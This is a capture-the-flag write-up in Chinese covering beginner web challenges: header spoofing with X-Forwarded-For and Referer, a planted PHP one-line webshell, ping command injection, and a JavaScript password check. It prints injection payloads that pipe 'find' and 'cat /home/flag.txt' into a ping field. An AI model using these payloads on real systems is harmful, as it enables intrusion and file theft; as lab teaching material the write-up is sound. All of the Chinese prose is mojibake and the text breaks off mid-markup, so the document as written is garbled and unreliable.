<p><code>ï¼ˆ1ï¼‰X-Forwarded-For:ç®€ç§°XFFå¤´ï¼Œå®ƒä»£è¡¨å®¢æˆ·ç«¯ï¼Œä¹Ÿå°±æ˜¯HTTPçš„è¯·æ±‚ç«¯çœŸå®çš„IPï¼Œåªæœ‰åœ¨é€šè¿‡äº†HTTP  ä»£ç†æˆ–è€…è´Ÿè½½å‡è¡¡æœåŠ¡å™¨æ—¶æ‰ä¼šæ·»åŠ è¯¥é¡¹ã€‚xffæ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯ä½¿WebæœåŠ¡å™¨è·å–è®¿é—®ç”¨æˆ·çš„IPçœŸå®åœ°å€ï¼ˆå¯ä¼ªé€ ï¼‰ã€‚ç”±äºå¾ˆå¤šç”¨æˆ·é€šè¿‡ä»£ç†æœåŠ¡å™¨è¿›è¡Œè®¿é—®ï¼ŒæœåŠ¡å™¨åªèƒ½è·å–ä»£ç†æœåŠ¡å™¨çš„IPåœ°å€ï¼Œè€Œxffçš„ä½œç”¨åœ¨äºè®°å½•ç”¨æˆ·çš„çœŸå®IPï¼Œä»¥åŠä»£ç†æœåŠ¡å™¨çš„IPã€‚æ ¼å¼ä¸ºï¼šX-Forwarded-For: æœ¬æœºIP, ä»£ç†1IP, ä»£ç†2IP, ä»£ç†2IP</code></p>
<p><code>ï¼ˆ2ï¼‰HTTP Refereræ˜¯headerçš„ä¸€éƒ¨åˆ†ï¼Œå½“æµè§ˆå™¨å‘webæœåŠ¡å™¨å‘é€è¯·æ±‚çš„æ—¶å€™ï¼Œä¸€èˆ¬ä¼šå¸¦ä¸ŠRefererï¼Œå‘Šè¯‰æœåŠ¡å™¨æˆ‘æ˜¯ä»å“ªä¸ªé¡µé¢é“¾æ¥è¿‡æ¥çš„ï¼ŒæœåŠ¡å™¨åŸºæ­¤å¯ä»¥è·å¾—ä¸€äº›ä¿¡æ¯ç”¨äºå¤„ç†ã€‚referer  æ˜¯httpçš„æ‹“å±•å¤´éƒ¨ï¼Œä½œç”¨æ˜¯è®°å½•å½“å‰è¯·æ±‚é¡µé¢çš„æ¥æºé¡µé¢çš„åœ°å€ã€‚æœåŠ¡å™¨ä½¿ç”¨refererç¡®è®¤è®¿é—®æ¥æºï¼Œå¦‚æœrefererå†…å®¹ä¸ç¬¦åˆè¦æ±‚ï¼ŒæœåŠ¡å™¨å¯ä»¥æ‹¦æˆªæˆ–è€…é‡å®šå‘è¯·æ±‚ã€‚</code></p>
<p>æŠ“åŒ…åï¼Œå‘ç°å¹¶æ²¡æœ‰X-Forwarded-Forå’ŒRefererï¼ŒåŠ ä¸Šå³å¯</p>
<p><img src="/post/wp-Gongfang/image-20220624173529705.png" alt="image-20220624173529705"></p>
<p>çœ‹é¢˜ç•Œé¢ï¼Œæç¤ºipå¿…é¡»ä¸º123.123.123.123ï¼Œäºæ˜¯åœ¨æŠ“åŒ…æ•°æ®é‡ŒåŠ ä¸Š</p>
<p><code>X-Forwarded-Forï¼š 123.123.123.123</code></p>
<p><img src="/post/wp-Gongfang/image-20220624174546646.png" alt="image-20220624174546646"></p>
<p>sendæ•°æ®åï¼Œå‘ç°responseé‡Œå‡ºç°ä»¥ä¸‹æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´è¿˜æœ‰å£°æ˜æ˜¯ä»è°·æ­Œç•Œé¢è¿‡æ¥çš„</p>
<p><img src="/post/wp-Gongfang/image-20220624173805175.png" alt="image-20220624173805175"></p>
<p>ä¹Ÿå°±æ˜¯è¿˜è¦åŠ ä¸Š</p>
<p><code>Referer:  https://www.google.com</code></p>
<p>æœ€åå¦‚ä¸‹</p>
<p><img src="/post/wp-Gongfang/image-20220624174117936.png" alt="image-20220624174117936"></p>
<p>sendåˆ°responseå</p>
<p>å¾—åˆ° flag</p>
<h2 id="10-webshell"><a href="#10-webshell" class="headerlink" title="10.webshell"></a>10.webshell</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®ç™¾åº¦äº†phpä¸€å¥è¯,è§‰ç€å¾ˆæœ‰æ„æ€,å¹¶ä¸”æŠŠå®ƒæ”¾åœ¨index.phpé‡Œ</p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>çœ‹åˆ°è¿™å¥ä»£ç æˆ‘ä¸€ä¸‹æƒ³åˆ°ä¸€å¥è¯æœ¨é©¬ï¼Œæ ‡é¢˜<a href="../../../../2022/06/21/Qusetion/">webshell</a>ä¹Ÿæç¤ºè¿™ä¸ªæœ¨é©¬é¢˜ï¼Œæ ¹æ®æè¿°æˆ‘ä»¬çŸ¥é“è¿™ä¸ªæœ¨é©¬åœ¨index.phpé‡Œ</p>
<p>ä¸äº†è§£çš„å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« </p>
<p><a href="https://www.jianshu.com/p/6b815f951db3">phpä¸€å¥è¯æœ¨é©¬</a></p>
<p><img src="/post/wp-Gongfang/image-20220624210259387.png" alt="image-20220624210259387"></p>
<p>ç”¨èšå‰‘è¿æ¥å³å¯ï¼Œè¿™é‡Œå¯¹èšå‰‘ä½¿ç”¨æ–¹æ³•ä¸èµ˜è¿°ï¼Œå»ºè®®è‡ªå·±æ“ä½œå­¦ä¹ </p>
<p>å¾—åˆ°flag</p>
<h2 id="11-command-execution"><a href="#11-command-execution" class="headerlink" title="11.command_execution"></a>11.command_execution</h2><h3 id="1-é¢˜ç›®æè¿°-10"><a href="#1-é¢˜ç›®æè¿°-10" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>å°å®å†™äº†ä¸ªpingåŠŸèƒ½,ä½†æ²¡æœ‰å†™waf,Xè€å¸ˆå‘Šè¯‰å¥¹è¿™æ˜¯éå¸¸å±é™©çš„ï¼Œä½ çŸ¥é“ä¸ºä»€ä¹ˆå—ã€‚</p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>æ ¹æ®é¢˜ç›®åçŸ¥é“è¿™æ˜¯å‘½ä»¤æ‰§è¡Œæ¼æ´çš„é¢˜ï¼Œå¯ä»¥å…ˆäº†è§£ä¸€ä¸‹<a href="../../../../2022/05/28/Web-study">å‘½ä»¤æ‰§è¡Œ</a>çš„çŸ¥è¯†</p>
<p>å…ˆç”¨è‡ªå·±çš„IPè¯•ä¸€ä¸‹</p>
<p><code>120.0.0.1</code></p>
<p><img src="/post/wp-Gongfang/image-20220624213448262.png" alt="image-20220624213448262"></p>
<p>å¾—åˆ°ä»¥ä¸‹æ•°æ®ï¼Œç”±æ­¤å¯çŸ¥æˆ‘ä»¬ä¸Šä¼ çš„å‘½ä»¤æ˜¯<code>ping -c 3 + è¾“å…¥çš„è¯­å¥</code>ï¼Œæ‰€ä»¥éœ€è¦ç”¨åˆ°ç®¡é“ç¬¦</p>
<p>æ­¤å¤„ä¸æ­¢å¯ä»¥ç”¨ |ï¼Œäº†è§£äº†å…¶ä»–ç®¡é“ç¬¦çš„ä½œç”¨ï¼Œä¹Ÿå¯ä»¥è¾¾åˆ°ç›¸åŒçš„æ•ˆæœ</p>
<p><img src="/post/wp-Gongfang/image-20220624215127339.png" alt="image-20220624215127339"></p>
<p>åœ¨åˆ©ç”¨ç®¡é“ç¬¦ï¼Œåœ¨å½“å‰ç›®å½•åŠå…¶å­ç›®å½•æŸ¥æ‰¾æœ‰æ²¡æœ‰åä¸ºflag.txtçš„æ–‡ä»¶</p>
<p><code>120.0.0.1 | find  / -name flag.txt</code></p>
<p><img src="/post/wp-Gongfang/image-20220624215415187.png" alt="image-20220624215415187"></p>
<p>å¾—åˆ°flag.txtçš„ä½ç½®çš„ç»å¯¹è·¯å¾„</p>
<p>è¾“å‡ºæ‰“å°flag,txt</p>
<p><code>120.0.0.1 | cat /home/flag.txt</code></p>
<p>å¾—åˆ°flag</p>
<h2 id="12-simple-js"><a href="#12-simple-js" class="headerlink" title="12.simple_js"></a>12.simple_js</h2><h3 id="1ï¼‰é¢˜ç›®æè¿°"><a href="#1ï¼‰é¢˜ç›®æè¿°" class="headerlink" title="1ï¼‰é¢˜ç›®æè¿°"></a>1ï¼‰é¢˜ç›®æè¿°</h3><p>å°å®å‘ç°äº†ä¸€ä¸ªç½‘é¡µï¼Œä½†å´ä¸€ç›´è¾“ä¸å¯¹å¯†ç ã€‚</p>
<p>(Flagæ ¼å¼ä¸º Cyberpeace{xxxxxxxxx} )</p>
<h3 id="2ï¼‰wp-2"><a href="#2ï¼‰wp-2" class="headerlink" title="2ï¼‰wp"></a>2ï¼‰wp</h3><p>è¯¥é¢˜æ¶‰åŠä»£ç å®¡è®¡ï¼Œçœ‹èµ·æœ‰ç‚¹éš¾åº¦ï¼Œä½†è¯´å®è¯å¤§éƒ¨åˆ†å†…å®¹ä¸ä»£ç å®¡è®¡æ— å…³ï¼Œä½†å¯ä»¥åˆ†æä¸€ä¸‹</p>
<p>å¼€å§‹ç•Œé¢å¼¹çª—è¾“å…¥å¯†ç </p>
<p><img src="/post/wp-Gongfang/image-20220624221241740.png" alt="image-20220624221241740"></p>
<p>è¾“å…¥é”™è¯¯ï¼Œæç¤ºFAUX PASSWORD HAHA</p>
<p><img src="/post/wp-Gongfang/image-20220624221310762.png" alt="image-20220624221310762"></p>
<p>æˆ‘ä»¬F12æŠŠå®ƒæºç æ‹¿å‡ºæ¥åˆ†æä¸€ä¸‹</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>JS<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">dechiffre</span>(<span class="params">pass_enc</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> pass = <span class="string">&quot;70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab  = pass_enc.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> tab2 = pass.<span class="title function_">split</span>(<span class="string">&#x27;,&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">&quot;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">        i = <span class="number">0</span>;</span></span><br><span class="line"><span class="language-javascript">        j = tab.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        k = j + (l) + (n=<span class="number">0</span>);</span></span><br><span class="line"><span class="language-javascript">        n = tab2.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">    &#123;o = tab[i-l];p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">                    <span class="keyword">if</span>(i == <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span></span><br><span class="line"><span class="language-javascript">               <span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )</span></span><br><span class="line"><span class="language-javascript">               &#123;</span></span><br><span class="line"><span class="language-javascript">                   o = tab[i-l];</span></span><br><span class="line"><span class="language-javascript">                   <span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k-<span class="number">1</span>)</span></span><br><span class="line"><span class="language-javascript">                   p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>((o = tab2[i]));</span></span><br><span class="line"><span class="language-javascript">               &#125;</span></span><br><span class="line"><span class="language-javascript">        p += <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(tab2[<span class="number">17</span>]);</span></span><br><span class="line"><span class="language-javascript">        pass = p;<span class="keyword">return</span> pass;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    <span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30&quot;</span>));</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    h = <span class="variable language_">window</span>.<span class="title function_">prompt</span>(<span class="string">&#x27;Enter password&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>( <span class="title function_">dechiffre</span>(h) );</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>æˆ‘ä»¬çœ‹åˆ°å¼€å¤´ä¸€å¤§ä¸²ä»£ç å…ˆä¸ç€æ€¥ï¼ŒæŒ¨ä¸ªåˆ†æ</p>
<p>æœ€æ˜¾çœ¼çš„å°±æ˜¯è¿™ä¸²16è¿›åˆ¶ç </p>
<p><code>\x35\x35\x2c\x35\x36\x2c\x35\x34\x2c\x37\x39\x2c\x31\x31\x35\x2c\x36\x39\x2c\x31\x31\x34\x2c\x31\x31\x36\x2c\x31\x30\x37\x2c\x34\x39\x2c\x35\x30</code></p>
<p>æˆ‘ä»¬å¯ä»¥å…ˆç”¨python ç›´æ¥è¾“å‡ºï¼Œå¾—åˆ°10è¿›åˆ¶</p>
<p><img src="/post/wp-Gongfang/image-20220624223640446.png" alt="image-20220624223640446"></p>
<p>è¿™é‡Œæˆ‘ä»¬æŠŠè¿™ä¸²10è¿›åˆ¶æ•°æŒ‰asciiç è½¬åŒ–ä¸ºå­—ç¬¦ä¸²</p>
<p>786OsErtk12</p>
<p>æŒ‰æè¿°å¡«å†™ </p>
<p>å¾—åˆ°flag : Cyberpeace{786OsErtk12}</p>
<hr>
<p>æˆ‘å¯¹ä»£ç å®¡è®¡è¿˜ä¸å¤ªç†Ÿæ‚‰ï¼Œä¸‹é¢å¼•ç”¨ä¸€ç¯‡å¤§ä½¬çš„ä»£ç å®¡è®¡</p>
<p><a href="https://blog.csdn.net/qq_41617034/article/details/91490695">https://blog.csdn.net/qq_41617034/article/details/91490695</a></p>
<figure class="highlight wren"><table><tr><td class="code"><pre><span class="line">æ‰§è¡Œæµç¨‹ï¼š</span><br><span class="line">ä¸€ã€é¦–å…ˆå®šä¹‰äº†ä¸€ä¸ª<span class="variable">dechiffre</span>å‡½æ•°ï¼Œå’±å…ˆä¸ç®¡ï¼Œå› ä¸ºè¿˜æ²¡æœ‰è°ƒç”¨</span><br><span class="line">æ³¨ï¼šå…ˆå°†\<span class="variable">x35</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x37</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x35</span>\<span class="variable">x2c</span>\<span class="variable">x36</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x34</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x31</span>\<span class="variable">x36</span>\<span class="variable">x2c</span>\<span class="variable">x31</span>\<span class="variable">x30</span>\<span class="variable">x37</span>\<span class="variable">x2c</span>\<span class="variable">x34</span>\<span class="variable">x39</span>\<span class="variable">x2c</span>\<span class="variable">x35</span>\<span class="variable">x30</span>åå…­è¿›åˆ¶æ•°è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œ<span class="variable">python</span>ä¸‹<span class="variable">print</span>å³å¯ï¼Œæˆ–ç½‘å€ï¼š<span class="variable">https</span>:<span class="comment">//www.bejson.com/convert/ox2str/</span></span><br><span class="line">è¾“å‡ºç»“æœ<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span></span><br><span class="line"></span><br><span class="line">äºŒã€æ‰§è¡Œ<span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line"></span><br><span class="line">ä¸‰ã€è°ƒç”¨äº†<span class="variable">dechiffre</span>ï¼Œæ‰§è¡Œ<span class="variable">dechiffre</span>å‡½æ•°</span><br><span class="line"><span class="title class_">String</span>[<span class="string">&quot;fromCharCode&quot;</span>](<span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>));</span><br><span class="line">(<span class="number">1</span>)å…ˆå°†<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>å¸¦å…¥<span class="variable">dechiffre</span>å‡½æ•°æ‰§è¡Œï¼Œå³<span class="title function_">dechiffre</span>(<span class="variable">pass_enc</span>)<span class="operator">=</span><span class="title function_">dechiffre</span>(<span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50</span></span><br><span class="line"><span class="string">&quot;</span>)</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>)æ¥ç€æˆ‘ä»¬çœ‹åˆ°äº†<span class="variable">pass</span>å˜é‡ï¼Œæš‚æ—¶å…ˆæ”¾ç€</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)å› ä¸º<span class="variable">pass_enc</span><span class="operator">=</span><span class="string">&quot;55,56,54,79,115,69,114,116,107,49,50&quot;</span></span><br><span class="line">å°†<span class="variable">pass_enc</span>å­—ç¬¦ä¸²åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼Œèµ‹å€¼ç»™<span class="variable">tab</span>å‚æ•°ï¼Œæ‰€ä»¥ï¼š</span><br><span class="line"><span class="variable">tab</span><span class="operator">=</span>[<span class="number">55</span>,<span class="number">56</span>,<span class="number">54</span>,<span class="number">79</span>,<span class="number">115</span>,<span class="number">69</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">107</span>,<span class="number">49</span>,<span class="number">50</span>]   æ³¨ï¼š<span class="variable">tab</span>æ­¤æ—¶æ˜¯å­—ç¬¦ä¸²æ•°ç»„ï¼ï¼ï¼</span><br><span class="line"></span><br><span class="line">(<span class="number">3</span>)éšåä¹Ÿå¯¹<span class="variable">pass</span>åˆ†å‰²</span><br><span class="line"><span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line"></span><br><span class="line">(<span class="number">4</span>)å˜é‡èµ‹å€¼ä»£ç åˆ†æï¼š<span class="keyword">var</span> <span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,<span class="variable">p</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;<span class="variable">j</span> <span class="operator">=</span> <span class="variable">tab</span>.<span class="property">length</span>;</span><br><span class="line">ä¸€å¼€å§‹<span class="variable">i</span>,<span class="variable">j</span>,<span class="variable">k</span>,<span class="variable">m</span>,<span class="variable">n</span>,<span class="variable">o</span>,æ²¡æœ‰èµ‹å€¼ï¼Œä¸º<span class="variable">undefined</span>ï¼Œå…¶å®ƒå‚æ•°<span class="variable">l</span><span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span>ï¼Œåæ¥<span class="variable">i</span>è¢«èµ‹å€¼<span class="operator">=</span><span class="number">0</span>ï¼Œ<span class="variable">j</span>è¢«èµ‹å€¼ä¸º<span class="number">11</span></span><br><span class="line"></span><br><span class="line">(<span class="number">5</span>)ç¬¬ä¹è¡Œæ­¤æ—¶<span class="variable">n</span>è¢«èµ‹å€¼ä¸º<span class="number">0</span>ï¼Œæ‰€ä»¥<span class="variable">k</span><span class="operator">=</span><span class="number">11</span><span class="operator">+</span><span class="number">0</span><span class="operator">+</span><span class="number">0</span>ï¼Œæœ€åç­‰äº<span class="number">11</span>    æ³¨ï¼šè¿™é‡Œçš„(<span class="variable">l</span>)å…¶ä¸­æ˜¯è‹±æ–‡å­—æ¯<span class="variable">l</span>ï¼Œä¸æ˜¯æ•°å­—<span class="number">1</span></span><br><span class="line"></span><br><span class="line">(<span class="number">6</span>)ç¬¬åè¡Œä¸­ï¼Œ<span class="variable">n</span><span class="operator">=</span><span class="number">18</span></span><br><span class="line"></span><br><span class="line">(<span class="number">7</span>)ç¬¬ä¸€ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> (<span class="number">18</span>); <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )</span><br><span class="line">&#123;<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">==</span> <span class="number">5</span>)<span class="keyword">break</span>;&#125;</span><br><span class="line">è§£é‡Šï¼šå‰é¢çš„<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="variable">i</span><span class="number">-1</span>]æ˜¯æ— ç”¨çš„ï¼Œå› ä¸ºåé¢ä¼šè¢«<span class="variable">o</span><span class="operator">=</span><span class="variable">tab2</span>[<span class="variable">i</span>]çš„å€¼é‡æ–°è¦†ç›–</span><br><span class="line">ç¬¬ä¸€æ¬¡å¾ªç¯ï¼š<span class="variable">o</span><span class="operator">=</span><span class="variable">tab</span>[<span class="number">0</span>];<span class="variable">p</span><span class="operator">=</span><span class="variable">p</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="number">0</span>])</span><br><span class="line"><span class="operator">=</span><span class="operator">&gt;</span><span class="variable">o</span><span class="operator">=</span><span class="number">70</span>;<span class="variable">p</span><span class="operator">=</span><span class="string">&quot;&quot;</span><span class="operator">+</span><span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="number">70</span>)<span class="operator">=</span><span class="operator">&gt;</span><span class="variable">p</span><span class="operator">=</span>è‹±æ–‡å­—æ¯<span class="variable">F</span></span><br><span class="line">ç¬¬äºŒæ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬ä¸‰æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬å››æ¬¡<span class="operator">...</span></span><br><span class="line">ç¬¬äº”æ¬¡<span class="operator">...</span></span><br><span class="line">æ‰€ä»¥ï¼Œè¿™ä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œæœ€åçš„<span class="variable">p</span>ä¸ºï¼ˆå°½ç®¡æ²¡æœ‰è¾“å‡ºå‡ºæ¥ï¼Œè¿™é‡Œæˆ‘ä»¬çŸ¥é“å°±å¥½ï¼‰<span class="variable">FAUX</span> <span class="title function_">P</span></span><br><span class="line"></span><br><span class="line">(<span class="number">8</span>)ç¬¬äºŒä¸ª<span class="keyword">for</span>å¾ªç¯ï¼Œç²¾ç®€ä¸€ä¸‹ä»£ç ï¼š</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">18</span>; <span class="variable">i</span><span class="operator">+</span><span class="operator">+</span> )&#123;</span><br><span class="line"><span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab</span>[<span class="variable">i</span><span class="operator">-</span><span class="variable">l</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">i</span> <span class="operator">&gt;</span> <span class="number">5</span> <span class="operator">&amp;&amp;</span> <span class="variable">i</span> <span class="operator">&lt;</span> <span class="number">17</span>)</span><br><span class="line">        <span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>((<span class="variable">o</span> <span class="operator">=</span> <span class="variable">tab2</span>[<span class="variable">i</span>]));</span><br><span class="line">&#125;</span><br><span class="line">è§£é‡Šï¼šè¿™é‡Œçš„<span class="keyword">for</span>å¾ªç¯å’Œä¸Šé¢çš„å·®ä¸å¤šï¼Œæ³¨æ„è¿™é‡Œçš„<span class="variable">p</span>å€¼ç”±äºç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯æ‰§è¡Œåç°åœ¨å·²ç»æ˜¯<span class="variable">FAUX</span> <span class="variable">P</span>äº†</span><br><span class="line">åŠ ä¸Šç¬¬ä¸€æ¬¡<span class="keyword">for</span>å¾ªç¯çš„<span class="variable">p</span>å€¼ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAH</span></span><br><span class="line"></span><br><span class="line">(<span class="number">9</span>)<span class="variable">p</span> <span class="operator">+</span><span class="operator">=</span> <span class="title class_">String</span>.<span class="property">fromCharCode</span>(<span class="variable">tab2</span>[<span class="number">17</span>]);</span><br><span class="line">å› ä¸º<span class="variable">tab2</span><span class="operator">=</span>[<span class="number">70</span>,<span class="number">65</span>,<span class="number">85</span>,<span class="number">88</span>,<span class="number">32</span>,<span class="number">80</span>,<span class="number">65</span>,<span class="number">83</span>,<span class="number">83</span>,<span class="number">87</span>,<span class="number">79</span>,<span class="number">82</span>,<span class="number">68</span>,<span class="number">32</span>,<span class="number">72</span>,<span class="number">65</span>,<span class="number">72</span>,<span class="number">65</span>]</span><br><span class="line">æ‰€ä»¥ï¼š<span class="variable">p</span><span class="operator">=</span><span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAH</span> <span class="operator">+</span> <span class="variable">A</span></span><br><span class="line">å› æ­¤ï¼Œæœ€åçš„<span class="variable">p</span>ä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="title function_">HAHA</span></span><br><span class="line"></span><br><span class="line">(<span class="number">10</span>)<span class="variable">pass</span> <span class="operator">=</span> <span class="variable">p</span>;<span class="keyword">return</span> <span class="variable">pass</span>;</span><br><span class="line"> å³ <span class="variable">pass</span> <span class="operator">=</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;<span class="keyword">return</span> <span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span>;</span><br><span class="line"> æœ€åå‡½æ•°è¾“å‡ºä¸º<span class="variable">FAUX</span> <span class="variable">PASSWORD</span> <span class="variable">HAHA</span></span><br><span class="line"></span><br><span class="line">å—¯å“¼ï¼Ÿï¼Ÿï¼Ÿè¿™ä¸ªå‡½æ•°å°±æ‰§è¡Œå®Œäº†ï¼Ÿï¼Ÿï¼Ÿæˆ‘çš„<span class="variable">tab</span>æ•°ç»„æ€ä¹ˆæ²¡æœ‰ç”¨åˆ°ï¼Ÿï¼Ÿï¼Ÿï¼Œæˆ‘ä¸€å¼€å§‹å¸¦è¿›æ¥çš„å‚æ•°å‘¢ï¼Ÿå»å“ªäº†ï¼Ÿåˆ«æƒ³äº†ï¼Œè¾“å‡ºå€¼è™½ç„¶ç”¨åˆ°äº†å¸¦è¿›æ¥çš„å‚æ•°(å°±æ˜¯åˆ†å‰²åçš„<span class="variable">tab</span>æ•°ç»„)ï¼Œä½†æ˜¯<span class="keyword">for</span>å¾ªç¯é‚£é‡Œäººå®¶ç›´æ¥ä½¿ç”¨<span class="variable">tab2</span>æ•°ç»„ç›¸å…³ä»£ç çš„å€¼ï¼Œæ ¹æœ¬æ²¡æœ‰ç”¨åˆ°<span class="variable">tab</span>æ•°ç»„çš„å€¼ï¼Œæ‰€ä»¥ç”±äºä»£ç é€»è¾‘é—®é¢˜ï¼Œä½ ä¼ å…¥çš„<span 